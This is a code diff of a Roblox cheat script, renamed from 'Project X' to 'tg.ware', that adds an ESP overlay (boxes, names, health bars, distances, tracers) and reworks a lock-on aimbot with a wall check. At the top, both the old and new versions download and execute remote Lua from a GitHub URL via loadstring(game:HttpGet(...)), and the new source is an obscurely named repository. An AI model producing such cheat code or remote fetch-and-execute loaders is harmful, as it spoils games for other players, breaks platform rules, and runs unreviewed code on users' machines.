@@ -1,297 +1,303 @@
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/drillygzzly/Roblox-UI-Libs/main/1%20Tokyo%20Lib%20(FIXED)/Tokyo%20Lib%20Source.lua"))({
-    cheatname = "project_x",
-    gamename = "universal",
+getgenv().Config = {
+	Invite = "getprojectx",
+	Version = "1.1",
+}
+
+getgenv().luaguardvars = {
+	DiscordName = "bbcdemon_455",
+}
+
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bbcdemon445/dgrfgdfdasd/main/Ohio."))()
+
+library:init() -- Initalizes Library Do Not Delete This
+
+local Window = library.NewWindow({
+	title = "tg.ware",
+	size = UDim2.new(0, 600, 0.5, 6)
 })
 
-library:init()
+local tabs = {
+    Combat = Window:AddTab("Combat"),
+    Visuals = Window:AddTab("Visuals"),
+	AntiAim = Window:AddTab("Anti Aim"),
+	Misc = Window:AddTab("Misc"),
+	Settings1 = library:CreateSettingsTab(Window),
+}
 
-local Window1 = library.NewWindow({
-    title = "Project X / V2 ",
-    size = UDim2.new(0, 600, 0.5, 6)
-})
+local sections = {
+    AimbotSection = tabs.Combat:AddSection("Aimbot", 1),
+    FOVSection = tabs.Combat:AddSection("FOV", 2),
+    ESPSection = tabs.Visuals:AddSection("ESP", 1),
+    ESPColorSection = tabs.Visuals:AddSection("Colors", 2),
+    XRaySection = tabs.Visuals:AddSection("XRay", 3),
+    AntiAimSection = tabs.AntiAim:AddSection("Anti Aim", 1),
+    CameraOffsetSection = tabs.AntiAim:AddSection("Camera Offset", 2),
+    MovementSection = tabs.Misc:AddSection("Movement", 1),
+    ThirdPersonSection = tabs.Misc:AddSection("ThirdPerson", 2)
+}
 
-local MainTab = Window1:AddTab("  Main  ")
-local ESPTab = Window1:AddTab("  Visuals  ")
-local PlayerTab = Window1:AddTab("  Player  ")
-local MiscTab = Window1:AddTab("  Misc  ")
-local SettingsTab = library:CreateSettingsTab(Window1)
-
-local BoxEnabled = false
-local BoxInvisibleCheck = false
-local BoxTeamCheck = false
-local Healthbars = false
-local HealthBarInvischeck = false
-local HealthBarTeamCheck = false
-local NameESPEnable = false
-local NameESPInvisible = false
-local NameESPTeamCheck = false
-local DistanceESP_Enabled = false
-local DistanceESP_TeamCheck = false
-local DistanceESP_InvisCheck = false
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- Create a table to store the text drawings
-local distanceTexts = {}
-
--- Function to create a new text drawing
-local function createText()
-    local text = Drawing.new("Text")
-    text.Size = 10
-    text.Color = Color3.new(1, 1, 1)
-    text.Center = true
-    text.Outline = true
-    text.Visible = true
-    return text
+if game.PlaceId == 4888256398 or game.PlaceId == 17227761001 or game.PlaceId == 15247475957 then
+    sections.TGSection = tabs.Misc:AddSection("Tournament Grounds", 3)
 end
 
--- Function to check if a player is on the same team
-local function isOnSameTeam(player1, player2)
-    if player1.Team == nil or player2.Team == nil then
+-- Variables
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local Cache = {}
+local lplr = game.Players.LocalPlayer
+local mouse = game:GetService("Players").LocalPlayer:GetMouse()
+local mousePosition = Vector2.new(mouse.X, mouse.Y)
+
+-- Settings
+local ESP_SETTINGS = {
+    OutlineColor = Color3.new(0, 0, 0),
+    BoxColor = Color3.new(1, 1, 1),
+    NameColor = Color3.new(1, 1, 1),
+    DistanceColor = Color3.new(1, 1, 1),
+    HealthOutlineColor = Color3.new(0, 0, 0),
+    HealthHighColor = Color3.new(0, 1, 0),
+    HealthLowColor = Color3.new(1, 0, 0),
+    CharSize = Vector2.new(4, 6),
+    TeamCheck = false,
+    WallCheck = false,
+    InvisCheck = false,
+    AliveCheck = false,
+    Enabled = false,
+    ShowBox = false,
+    BoxType = "2D",
+    ShowName = false,
+    ShowHealth = false,
+    ShowDistance = false,
+    ShowTracer = false,
+    TracerColor = Color3.new(1, 1, 1), 
+    TracerThickness = 1,
+    TracerPosition = "Bottom",
+}
+
+local function create(class, properties)
+    local drawing = Drawing.new(class)
+    for property, value in pairs(properties) do
+        drawing[property] = value
+    end
+    return drawing
+end
+
+local function isPlayerBehindWall(player)
+    local character = player.Character
+    if not character then
         return false
     end
-    return player1.Team == player2.Team
-end
 
--- Function to check if a character is invisible
-local function isCharacterInvisible(character)
-    if not character then return false end
-    for _, part in ipairs(character:GetDescendants()) do
-        if part:IsA("BasePart") and part.Transparency < 1 then
-            return false
-        end
-    end
-    return true
-end
-
--- Function to update the text drawings with the distance
-local function updateDistanceTexts()
-    if not DistanceESP_Enabled then
-        for _, text in pairs(distanceTexts) do
-            text.Visible = false
-        end
-        return
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then
+        return false
     end
 
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            if DistanceESP_TeamCheck and isOnSameTeam(LocalPlayer, player) then
-                if distanceTexts[player.Name] then
-                    distanceTexts[player.Name].Visible = false
-                end
-            elseif DistanceESP_InvisCheck and isCharacterInvisible(player.Character) then
-                if distanceTexts[player.Name] then
-                    distanceTexts[player.Name].Visible = false
-                end
-            else
-                local distance = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
-                local legPosition = player.Character.HumanoidRootPart.Position - Vector3.new(0, 3, 0)
-                local screenPoint, onScreen = workspace.CurrentCamera:WorldToViewportPoint(legPosition)
+    local ray = Ray.new(Camera.CFrame.Position, (rootPart.Position - Camera.CFrame.Position).Unit * (rootPart.Position - Camera.CFrame.Position).Magnitude)
+    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character, character})
+    
+    return hit and hit:IsA("Part")
+end
 
-                if not distanceTexts[player.Name] then
-                    distanceTexts[player.Name] = createText()
-                end
+local function createEsp(player)
+    local esp = {
+        boxOutline = create("Square", {
+            Color = ESP_SETTINGS.OutlineColor,   
+            Thickness = 2,
+            Filled = false,
+            Visible = false
+        }),
+        box = create("Square", {
+            Color = ESP_SETTINGS.BoxColor,
+            Thickness = 1,
+            Filled = false,
+            Visible = false
+        }),
+        name = create("Text", {
+            Color = ESP_SETTINGS.NameColor,
+            Outline = true,
+            Center = true,
+            Size = 13,
+            Visible = false
+        }),
+        healthOutline = create("Line", {
+            Thickness = 3,
+            Color = ESP_SETTINGS.HealthOutlineColor,
+            Visible = false
+        }),
+        health = create("Line", {
+            Thickness = 2,
+            Visible = false
+        }),
+        distance = create("Text", {
+            Color = ESP_SETTINGS.DistanceColor,
+            Size = 12,
+            Outline = true,
+            Center = true,
+            Visible = false
+        }),
+        tracer = create("Line", {
+            Thickness = ESP_SETTINGS.TracerThickness,
+            Color = ESP_SETTINGS.TracerColor,
+            Transparency = 1,
+            Visible = false
+        }),
+        boxLines = {}
+    }
 
-                local text = distanceTexts[player.Name]
-                text.Text = string.format("[%.0f]", distance)
-                text.Position = Vector2.new(screenPoint.X, screenPoint.Y)
-                text.Visible = onScreen
+    Cache[player] = esp
+end
+
+local function removeEsp(player)
+    local esp = Cache[player]
+    if not esp then return end
+
+    for key, drawing in pairs(esp) do
+        if drawing.Remove then
+            drawing:Remove()
+        elseif key == "boxLines" then
+            for _, line in ipairs(drawing) do
+                if line.Remove then
+                    line:Remove()
+                end
             end
-        elseif distanceTexts[player.Name] then
-            distanceTexts[player.Name].Visible = false
+        else
+            print("No Remove method for", key)
         end
     end
+
+    Cache[player] = nil
 end
 
--- Update the distances every frame
-game:GetService("RunService").RenderStepped:Connect(updateDistanceTexts)
-
--- Cleanup the drawings when the player leaves
-Players.PlayerRemoving:Connect(function(player)
-    if distanceTexts[player.Name] then
-        distanceTexts[player.Name]:Remove()
-        distanceTexts[player.Name] = nil
-    end
-end)
-
-
-local lplr = game.Players.LocalPlayer
-local camera = workspace.CurrentCamera
-local worldToViewportPoint = camera.worldToViewportPoint
-
-local HeadOff = Vector3.new(0, 0.5, 0)
-local LegOff = Vector3.new(0, 3, 0)
-local ArmOffset = Vector3.new(0, 2.5, 0)
-
-local function createHealthbar()
-    local healthBackground = Drawing.new("Square")
-    healthBackground.Visible = false
-    healthBackground.Color = Color3.new(0, 0, 0)
-    healthBackground.Thickness = 1
-    healthBackground.Transparency = 0.5
-    healthBackground.Filled = true
-
-    local healthBar = Drawing.new("Square")
-    healthBar.Visible = false
-    healthBar.Thickness = 1
-    healthBar.Filled = true
-
-    return healthBackground, healthBar
-end
-
-local function updateHealthbar(healthBackground, healthBar, player, position, boxSize)
-    local character = player.Character
-    if character then
-        local humanoid = character:FindFirstChild("Humanoid")
-        if humanoid and humanoid.Health > 0 and humanoid.MaxHealth > 0 then
-            local healthRatio = humanoid.Health / humanoid.MaxHealth
-            local healthBarWidth = 2.5
-            local healthBarHeight = boxSize.Y
-            local healthBarOffset = 5
-
+local function updateEsp()
+    for player, esp in pairs(Cache) do
+        local character, team = player.Character, player.Team
+        if character and (not ESP_SETTINGS.TeamCheck or (team and team ~= LocalPlayer.Team)) then
             local rootPart = character:FindFirstChild("HumanoidRootPart")
-            if rootPart then
-                local vector, onScreen = worldToViewportPoint(camera, rootPart.Position)
-                if onScreen and Healthbars and (not HealthBarInvischeck or character.Head.Transparency ~= 1) then
-                    local healthBarHeightAdjusted = boxSize.Y * healthRatio
-                    healthBackground.Size = Vector2.new(healthBarWidth, healthBarHeight)
-                    healthBackground.Position = position - Vector2.new(healthBarOffset + healthBarWidth, 0)
-                    healthBackground.Visible = true
+            local head = character:FindFirstChild("Head")
+            local humanoid1 = character:FindFirstChild("Humanoid")
+            local isBehindWall = ESP_SETTINGS.WallCheck and isPlayerBehindWall(player)
+            local isnotDead = ESP_SETTINGS.AliveCheck and humanoid1 and humanoid1.Health == 0
+            local isInvisible = ESP_SETTINGS.InvisCheck and head and head.Transparency == 1
+            local shouldShow = not isBehindWall and ESP_SETTINGS.Enabled and not isInvisible and not isnotDead
+            if rootPart and shouldShow then
+                local position, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
+                if onScreen then
+                    local hrp2D = Camera:WorldToViewportPoint(rootPart.Position)
+                    local charSize = (Camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.6, 0)).Y) / 2
+                    local boxSize = Vector2.new(math.floor(charSize * 1.5), math.floor(charSize * 1.9))
+                    local boxPosition = Vector2.new(math.floor(hrp2D.X - charSize * 1.5 / 2), math.floor(hrp2D.Y - charSize * 1.6 / 2))
 
-                    healthBar.Size = Vector2.new(healthBarWidth, healthBarHeightAdjusted)
-                    healthBar.Position = position - Vector2.new(healthBarOffset + healthBarWidth, 0) + Vector2.new(0, (1 - healthRatio) * boxSize.Y / 2)
-                    healthBar.Color = Color3.new(1 - healthRatio, healthRatio, 0)
-                    healthBar.Visible = true
+                    if ESP_SETTINGS.ShowName and ESP_SETTINGS.Enabled then
+                        esp.name.Visible = true
+                        esp.name.Text = string.lower(player.Name)
+                        esp.name.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
+                        esp.name.Color = ESP_SETTINGS.NameColor
+                    else
+                        esp.name.Visible = false
+                    end
 
-                    if HealthBarTeamCheck and player.TeamColor == lplr.TeamColor then
-                        healthBackground.Visible = false
-                        healthBar.Visible = false
+                    if ESP_SETTINGS.ShowBox and ESP_SETTINGS.Enabled then
+                        if ESP_SETTINGS.BoxType == "2D" then
+                            esp.boxOutline.Size = boxSize
+                            esp.boxOutline.Position = boxPosition
+                            esp.box.Size = boxSize
+                            esp.box.Position = boxPosition
+                            esp.box.Color = ESP_SETTINGS.BoxColor
+                            esp.box.Visible = true
+                            esp.boxOutline.Visible = true
+                            for _, line in ipairs(esp.boxLines) do
+                                line:Remove()
+                            end
+                        end
+                    end
+
+                    if ESP_SETTINGS.ShowHealth and ESP_SETTINGS.Enabled then
+                        esp.healthOutline.Visible = true
+                        esp.health.Visible = true
+                        local healthPercentage = player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth
+                        esp.healthOutline.From = Vector2.new(boxPosition.X - 5.5, boxPosition.Y + boxSize.Y)
+                        esp.healthOutline.To = Vector2.new(esp.healthOutline.From.X, esp.healthOutline.From.Y - boxSize.Y)
+                        esp.health.From = Vector2.new((boxPosition.X - 5), boxPosition.Y + boxSize.Y)
+                        esp.health.To = Vector2.new(esp.health.From.X, esp.health.From.Y - healthPercentage * boxSize.Y)
+                        esp.health.Color = ESP_SETTINGS.HealthLowColor:Lerp(ESP_SETTINGS.HealthHighColor, healthPercentage)
+                    else
+                        esp.healthOutline.Visible = false
+                        esp.health.Visible = false
+                    end
+
+                    if ESP_SETTINGS.ShowDistance and ESP_SETTINGS.Enabled then
+                        local distance = (Camera.CFrame.p - rootPart.Position).Magnitude
+                        esp.distance.Text = string.format("%.1f studs", distance)
+                        esp.distance.Position = Vector2.new(boxPosition.X + boxSize.X / 2, boxPosition.Y + boxSize.Y + 5)
+                        esp.distance.Visible = true
+                        esp.distance.Color = ESP_SETTINGS.DistanceColor
+                    else
+                        esp.distance.Visible = false
+                    end
+
+                    if ESP_SETTINGS.ShowTracer and ESP_SETTINGS.Enabled then
+                        esp.tracer.Color = ESP_SETTINGS.TracerColor
+                        local tracerY
+                        if ESP_SETTINGS.TracerPosition == "Top" then
+                            tracerY = 0
+                        elseif ESP_SETTINGS.TracerPosition == "Middle" then
+                            tracerY = Camera.ViewportSize.Y / 2
+                        else
+                            tracerY = Camera.ViewportSize.Y
+                        end
+                        if ESP_SETTINGS.TeamCheck and player.TeamColor == LocalPlayer.TeamColor then
+                            esp.tracer.Visible = false
+                        else
+                            esp.tracer.Visible = true
+                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, tracerY)
+                            esp.tracer.To = Vector2.new(hrp2D.X, hrp2D.Y)            
+                        end
+                    else
+                        esp.tracer.Visible = false
                     end
                 else
-                    healthBackground.Visible = false
-                    healthBar.Visible = false
+                    for _, drawing in pairs(esp) do
+                        drawing.Visible = false
+                    end
                 end
             else
-                healthBackground.Visible = false
-                healthBar.Visible = false
+                for _, drawing in pairs(esp) do
+                    drawing.Visible = false
+                end
             end
         else
-            healthBackground.Visible = false
-            healthBar.Visible = false
+            for _, drawing in pairs(esp) do
+                drawing.Visible = false
+            end
         end
-    else
-        healthBackground.Visible = false
-        healthBar.Visible = false
     end
 end
 
-local function createESP(player)
-    local BoxOutline = Drawing.new("Square")
-    BoxOutline.Visible = false
-    BoxOutline.Color = Color3.new(0, 0, 0)
-    BoxOutline.Thickness = 3
-    BoxOutline.Transparency = 1
-    BoxOutline.Filled = false
 
-    local Box = Drawing.new("Square")
-    Box.Visible = false
-    Box.Color = Color3.new(1, 1, 1)
-    Box.Thickness = 1
-    Box.Transparency = 1
-    Box.Filled = false
-
-    local NameESPDraw = Drawing.new("Text")
-    NameESPDraw.Visible = false
-    NameESPDraw.Color = Color3.new(1, 1, 1)
-    NameESPDraw.Size = 14
-    NameESPDraw.Center = true
-    NameESPDraw.Outline = true
-
-    local healthBackground, healthBar = createHealthbar()
-
-    game:GetService("RunService").RenderStepped:Connect(function()
-        local character = player.Character
-        if character and character:FindFirstChild("Humanoid") and character:FindFirstChild("HumanoidRootPart") and player ~= lplr and character.Humanoid.Health > 0 then
-            local humanoid = character.Humanoid
-            local rigType = humanoid.RigType
-
-            local RootPart = character.HumanoidRootPart
-            local Head = character:FindFirstChild("Head")
-            local RightArm = rigType == Enum.HumanoidRigType.R6 and character:FindFirstChild("Right Arm") or character:FindFirstChild("RightUpperArm")
-            local LeftArm = rigType == Enum.HumanoidRigType.R6 and character:FindFirstChild("Left Arm") or character:FindFirstChild("LeftUpperArm")
-            local RightLeg = rigType == Enum.HumanoidRigType.R6 and character:FindFirstChild("Right Leg") or character:FindFirstChild("RightUpperLeg")
-            local LeftLeg = rigType == Enum.HumanoidRigType.R6 and character:FindFirstChild("Left Leg") or character:FindFirstChild("LeftUpperLeg")
-
-            if RootPart and Head and RightArm and LeftArm and RightLeg and LeftLeg then
-                local RootPosition, onScreen = worldToViewportPoint(camera, RootPart.Position)
-                if onScreen then
-                    if BoxInvisibleCheck and Head.Transparency == 1 then
-                        BoxOutline.Visible = false
-                        Box.Visible = false
-                        NameESPDraw.Visible = false
-                    else
-                        local HeadPosition = worldToViewportPoint(camera, Head.Position + HeadOff)
-                        local LegPosition = worldToViewportPoint(camera, RootPart.Position - LegOff)
-                        local RightArmPosition = worldToViewportPoint(camera, RightArm.Position + ArmOffset)
-                        local LeftArmPosition = worldToViewportPoint(camera, LeftArm.Position + ArmOffset)
-
-                        local topY = math.min(HeadPosition.Y, RightArmPosition.Y, LeftArmPosition.Y)
-                        local bottomY = math.max(LegPosition.Y, RightArmPosition.Y, LeftArmPosition.Y)
-                        local boxSize = Vector2.new(3000 / RootPosition.Z, topY - bottomY)
-
-                        BoxOutline.Size = boxSize
-                        BoxOutline.Position = Vector2.new(RootPosition.X - boxSize.X / 2, bottomY)
-                        BoxOutline.Visible = BoxEnabled
-
-                        Box.Size = boxSize
-                        Box.Position = Vector2.new(RootPosition.X - boxSize.X / 2, bottomY)
-                        Box.Visible = BoxEnabled
-
-                        if BoxTeamCheck and player.TeamColor == lplr.TeamColor then
-                            BoxOutline.Visible = false
-                            Box.Visible = false
-                        end
-
-                        NameESPDraw.Position = Vector2.new(RootPosition.X, topY - 20)
-                        NameESPDraw.Text = player.Name
-                        NameESPDraw.Visible = NameESPEnable
-
-                        if NameESPInvisible and Head.Transparency == 1 then
-                            NameESPDraw.Visible = false
-                        end
-
-                        if NameESPTeamCheck and player.TeamColor == lplr.TeamColor then
-                            NameESPDraw.Visible = false
-                        end
-                    end
-                else
-                    BoxOutline.Visible = false
-                    Box.Visible = false
-                    NameESPDraw.Visible = false
-                end
-            else
-                BoxOutline.Visible = false
-                Box.Visible = false
-                NameESPDraw.Visible = false
-            end
-        else
-            BoxOutline.Visible = false
-            Box.Visible = false
-            NameESPDraw.Visible = false
-        end
-
-        updateHealthbar(healthBackground, healthBar, player, Box.Position, Box.Size)
-    end)
+-- Initialize ESP for existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        createEsp(player)
+    end
 end
 
-for _, player in ipairs(game.Players:GetPlayers()) do
-    createESP(player)
-end
-
-game.Players.PlayerAdded:Connect(function(player)
-    createESP(player)
+-- Handle new players
+Players.PlayerAdded:Connect(function(player)
+    if player ~= LocalPlayer then
+        createEsp(player)
+    end
 end)
+
+-- Remove ESP when players leave
+Players.PlayerRemoving:Connect(function(player)
+    removeEsp(player)
+end)
+
+-- Update ESP on each frame
+RunService.RenderStepped:Connect(updateEsp)
 
 --// Cache
 local select = select
@@ -325,7 +331,7 @@ Environment.Settings = {
     Enabled = false,
     TeamCheck = false,
     AliveCheck = false,
-    WallCheck = false, -- Laggy
+    WallCheck = false, -- Enable wall check
     Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
     ThirdPerson = false, -- Uses mousemoverel instead of CFrame to support locking in third person (could be choppy)
     ThirdPersonSensitivity = 3, -- Boundary: 0.1 - 5
@@ -363,6 +369,15 @@ local function IsInFOV(targetPosition)
     return (targetPosition - mouseLocation).Magnitude <= fovCircleRadius
 end
 
+local function IsObstructed(target)
+    if not Environment.Settings.WallCheck == true then
+        return false
+    end
+    local targetPosition = target.Character[Environment.Settings.LockPart].Position
+    local parts = Camera:GetPartsObscuringTarget({targetPosition}, {LocalPlayer.Character, target.Character})
+    return #parts > 0
+end
+
 local function GetClosestPlayer()
     if not Environment.Locked then
         RequiredDistance = (Environment.FOVSettings.Enabled and Environment.FOVSettings.Amount or 2000)
@@ -372,16 +387,17 @@ local function GetClosestPlayer()
 
         for _, v in next, Players:GetPlayers() do
             if v ~= LocalPlayer then
-                if v.Character and v.Character:FindFirstChild(Environment.Settings.LockPart) and v.Character:FindFirstChildOfClass("Humanoid") then
+                local character = v.Character
+                if character and character:FindFirstChild(Environment.Settings.LockPart) and character:FindFirstChildOfClass("Humanoid") then
                     if Environment.Settings.TeamCheck and v.Team == LocalPlayer.Team then continue end
-                    if Environment.Settings.AliveCheck and v.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
-                    if Environment.Settings.WallCheck and #(Camera:GetPartsObscuringTarget({v.Character[Environment.Settings.LockPart].Position}, v.Character:GetDescendants())) > 0 then continue end
-                    if Environment.Settings.Invisible_Check and v.Character.Head and v.Character.Head.Transparency == 1 then continue end -- Check for transparency
+                    if Environment.Settings.AliveCheck and character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
+                    if Environment.Settings.Invisible_Check and character.Head and character.Head.Transparency == 1 then continue end
 
-                    local Vector, OnScreen = Camera:WorldToViewportPoint(v.Character[Environment.Settings.LockPart].Position)
+                    local lockPartPosition = character[Environment.Settings.LockPart].Position
+                    local Vector, OnScreen = Camera:WorldToViewportPoint(lockPartPosition)
                     local Distance = (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Vector.X, Vector.Y)).Magnitude
 
-                    if Distance < closestDistance and OnScreen then
+                    if Distance < closestDistance and OnScreen and (not Environment.Settings.WallCheck or not IsObstructed(v)) then
                         if not Environment.FOVSettings.Enabled or IsInFOV(Vector2(Vector.X, Vector.Y)) then
                             closestPlayer = v
                             closestDistance = Distance
@@ -416,12 +432,16 @@ local function GetClosestPlayer()
                 Environment.Settings.LockPart = closestPart.Name
             end
         end
-    elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position).X, Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position).Y)).Magnitude > RequiredDistance then
-        CancelLock()
+    else
+        local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
+        if Environment.Settings.WallCheck and IsObstructed(Environment.Locked) then
+            CancelLock()
+        elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(lockPartPosition).X, Camera:WorldToViewportPoint(lockPartPosition).Y)).Magnitude > RequiredDistance then
+            CancelLock()
+        end
     end
 end
 
---// Typing Check
 ServiceConnections.TypingStartedConnection = UserInputService.TextBoxFocused:Connect(function()
     Typing = true
 end)
@@ -430,18 +450,23 @@ ServiceConnections.TypingEndedConnection = UserInputService.TextBoxFocusReleased
     Typing = false
 end)
 
---// Main
 local function Load()
+    local UserInputService_GetMouseLocation = UserInputService.GetMouseLocation
+    local Camera_WorldToViewportPoint = Camera.WorldToViewportPoint
+    local mathclamp = math.clamp
+
     ServiceConnections.RenderSteppedConnection = RunService.RenderStepped:Connect(function()
         if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
-            Environment.FOVCircle.Radius = Environment.FOVSettings.Amount
-            Environment.FOVCircle.Thickness = Environment.FOVSettings.Thickness
-            Environment.FOVCircle.Filled = Environment.FOVSettings.Filled
-            Environment.FOVCircle.NumSides = Environment.FOVSettings.Sides
-            Environment.FOVCircle.Color = Environment.FOVSettings.Color
-            Environment.FOVCircle.Transparency = Environment.FOVSettings.Transparency
-            Environment.FOVCircle.Visible = Environment.FOVSettings.Visible
-            Environment.FOVCircle.Position = Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
+            local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
+            local fovCircle = Environment.FOVCircle
+            fovCircle.Radius = Environment.FOVSettings.Amount
+            fovCircle.Thickness = Environment.FOVSettings.Thickness
+            fovCircle.Filled = Environment.FOVSettings.Filled
+            fovCircle.NumSides = Environment.FOVSettings.Sides
+            fovCircle.Color = Environment.FOVSettings.Color
+            fovCircle.Transparency = Environment.FOVSettings.Transparency
+            fovCircle.Visible = Environment.FOVSettings.Visible
+            fovCircle.Position = Vector2(mouseLocation.X, mouseLocation.Y)
         else
             Environment.FOVCircle.Visible = false
         end
@@ -450,17 +475,19 @@ local function Load()
             GetClosestPlayer()
 
             if Environment.Locked then
+                local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
                 if Environment.Settings.ThirdPerson then
                     Environment.Settings.ThirdPersonSensitivity = mathclamp(Environment.Settings.ThirdPersonSensitivity, 0.1, 5)
 
-                    local Vector = Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position)
-                    mousemoverel((Vector.X - UserInputService:GetMouseLocation().X) * Environment.Settings.ThirdPersonSensitivity, (Vector.Y - UserInputService:GetMouseLocation().Y) * Environment.Settings.ThirdPersonSensitivity)
+                    local Vector = Camera_WorldToViewportPoint(Camera, lockPartPosition)
+                    local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
+                    mousemoverel((Vector.X - mouseLocation.X) * Environment.Settings.ThirdPersonSensitivity, (Vector.Y - mouseLocation.Y) * Environment.Settings.ThirdPersonSensitivity)
                 else
                     if Environment.Settings.Sensitivity > 0 then
-                        Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame= CFrame.new(Camera.CFrame.Position, Environment.Locked.Character[Environment.Settings.LockPart].Position)})
+                        Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame= CFrame.new(Camera.CFrame.Position, lockPartPosition)})
                         Animation:Play()
                     else
-                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, Environment.Locked.Character[Environment.Settings.LockPart].Position)
+                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, lockPartPosition)
                     end
                 end
 
@@ -471,115 +498,47 @@ local function Load()
 
     ServiceConnections.InputBeganConnection = UserInputService.InputBegan:Connect(function(Input)
         if not Typing then
-            pcall(function()
-                if Input.KeyCode == Environment.Settings.TriggerKey then
-                    if Environment.Settings.Toggle then
-                        Running = not Running
+            if Input.KeyCode == Environment.Settings.TriggerKey then
+                if Environment.Settings.Toggle then
+                    Running = not Running
 
-                        if not Running then
-                            CancelLock()
-                        end
-                    else
-                        Running = true
+                    if not Running then
+                        CancelLock()
                     end
+                else
+                    Running = true
                 end
-            end)
-
-            pcall(function()
-                if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == Environment.Settings.TriggerKey then
-                    if Environment.Settings.Toggle then
-                        Running = not Running
-
-                        if not Running then
-                            CancelLock()
-                        end
-                    else
-                        Running = true
-                    end
-                end
-            end)
+            end
         end
     end)
 
     ServiceConnections.InputEndedConnection = UserInputService.InputEnded:Connect(function(Input)
-        if not Typing then
-            if not Environment.Settings.Toggle then
-                pcall(function()
-                    if Input.KeyCode == Environment.Settings.TriggerKey then
-                        Running = false; CancelLock()
-                    end
-                end)
-
-                pcall(function()
-                    if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == Environment.Settings.TriggerKey then
-                        Running = false; CancelLock()
-                    end
-                end)
+        if not Typing and not Environment.Settings.Toggle then
+            if Input.KeyCode == Environment.Settings.TriggerKey then
+                Running = false
+                CancelLock()
             end
         end
     end)
 end
 
 --// Functions
+
 Environment.Functions = {}
 
 function Environment.Functions:Exit()
-    for _, v in next, ServiceConnections do
-        v:Disconnect()
+    for _, connection in next, ServiceConnections do
+        connection:Disconnect()
     end
 
-    if Environment.FOVCircle.Remove then Environment.FOVCircle:Remove() end
+    if Animation then Animation:Cancel() end
 
-    getgenv().Aimbot.Functions = nil
-    getgenv().Aimbot = nil
-    
-    Load = nil; GetClosestPlayer = nil; CancelLock = nil
+    Environment.FOVCircle:Remove()
 end
 
-function Environment.Functions:Restart()
-    for _, v in next, ServiceConnections do
-        v:Disconnect()
-    end
-
-    Load()
-end
-
-function Environment.Functions:ResetSettings()
-    Environment.Settings = {
-        Enabled = true,
-        TeamCheck = false,
-        AliveCheck = true,
-        WallCheck = false,
-        Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
-        ThirdPerson = false, -- Uses mousemoverel instead of CFrame to support locking in third person (could be choppy)
-        ThirdPersonSensitivity = 3, -- Boundary: 0.1 - 5
-        TriggerKey = Enum.KeyCode.MouseButton2, -- Reset keybind to MouseButton2
-        Toggle = false,
-        LockPart = "Head" -- Body part to lock on
-    }
-
-    Environment.FOVSettings = {
-        Enabled = true,
-        Visible = true,
-        Amount = 90,
-        Color = Color3.fromRGB(255, 255, 255),
-        LockedColor = Color3.fromRGB(255, 70, 70),
-        Transparency = 0.5,
-        Sides = 60,
-        Thickness = 1,
-        Filled = false
-    }
-end
-
---// Load
 Load()
 
-local Decimals = 4
-local Clock = os.clock()
-
-local MainSection = MainTab:AddSection("Main", 1)
-
-MainSection:AddToggle({
+sections.AimbotSection:AddToggle({
     text = "Aimbot",
     state = false,
     risky = false,
@@ -607,7 +566,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddList({
+sections.AimbotSection:AddList({
     enabled = true,
     text = "Aimbot type", 
     tooltip = "Choose if mouse or camera",
@@ -626,7 +585,7 @@ MainSection:AddList({
     end
 })
 
-MainSection:AddToggle({
+sections.AimbotSection:AddToggle({
     text = "Wall",
     state = false,
     risky = false,
@@ -637,7 +596,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
+sections.AimbotSection:AddToggle({
     text = "Invisible",
     state = false,
     risky = false,
@@ -648,7 +607,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
+sections.AimbotSection:AddToggle({
     text = "Alive",
     state = false,
     risky = false,
@@ -659,7 +618,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
